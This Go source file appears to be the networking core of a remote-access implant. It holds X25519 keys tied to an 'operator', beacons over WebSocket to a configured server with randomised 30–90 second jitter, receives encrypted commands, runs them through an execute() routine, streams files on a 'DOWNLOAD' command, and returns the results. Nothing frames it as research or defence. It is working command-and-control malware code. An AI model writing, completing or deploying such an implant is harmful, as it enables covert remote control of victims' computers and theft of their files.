package main

import (
	"context"
	"crypto/ecdh"
	"encoding/json"
	"fmt"
	"log"
	"sync"
	"time"

	"github.com/coder/websocket"
)

var (
	sharedKey    [32]byte
	agentPubBytes []byte
	wsConn       *websocket.Conn
	writeMu      sync.Mutex
)

func initTransport() {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(agentPrivKey)
	if err != nil {
		panic("parse agent key: " + err.Error())
	}
	agentPubBytes = priv.PublicKey().Bytes()
	sharedKey, _, err = deriveKeys(agentPrivKey, operatorPubKey)
	if err != nil {
		panic("derive keys: " + err.Error())
	}
}

func wsURL() string {
	scheme := "wss"
	if len(serverAddr) > 0 && (serverAddr[0] >= '0' && serverAddr[0] <= '9' || serverAddr[0] == '[') {
		scheme = "ws"
	}
	return fmt.Sprintf("%s://%s/", scheme, serverAddr)
}

func wsSend(v any) error {
	plain, err := json.Marshal(v)
	if err != nil {
		return err
	}
	ct, err := sealAEAD(sharedKey, plain)
	if err != nil {
		return err
	}
	writeMu.Lock()
	defer writeMu.Unlock()
	return wsConn.Write(context.Background(), websocket.MessageBinary, ct)
}

func wsSendRaw(plain []byte) error {
	ct, err := sealAEAD(sharedKey, plain)
	if err != nil {
		return err
	}
	writeMu.Lock()
	defer writeMu.Unlock()
	return wsConn.Write(context.Background(), websocket.MessageBinary, ct)
}

func wsLoop() {
	for {
		if err := wsSession(); err != nil {
			log.Printf("session: %v", err)
		}
		time.Sleep(jitterDuration(30000, 90000))
	}
}

func wsSession() error {
	ctx := context.Background()
	conn, _, err := websocket.Dial(ctx, wsURL(), nil)
	if err != nil {
		return err
	}
	defer conn.CloseNow()
	conn.SetReadLimit(24 << 20)
	wsConn = conn

	hello, _ := json.Marshal(map[string]string{"t": "hello"})
	ct, err := sealAEAD(sharedKey, hello)
	if err != nil {
		return err
	}
	frame := append(agentPubBytes, ct...)
	if err := conn.Write(ctx, websocket.MessageBinary, frame); err != nil {
		return err
	}

	for {
		_, msg, err := conn.Read(ctx)
		if err != nil {
			return err
		}
		plain, err := openAEAD(sharedKey, msg)
		if err != nil {
			continue
		}
		var cmd Command
		if json.Unmarshal(plain, &cmd) != nil {
			continue
		}
		if cmd.Op == "DOWNLOAD" {
			if err := streamDownload(cmd.Arg); err != nil {
				return err
			}
			continue
		}
		result := execute(cmd)
		resp := map[string]any{"data": result}
		if err := wsSend(resp); err != nil {
			return err
		}
	}
}
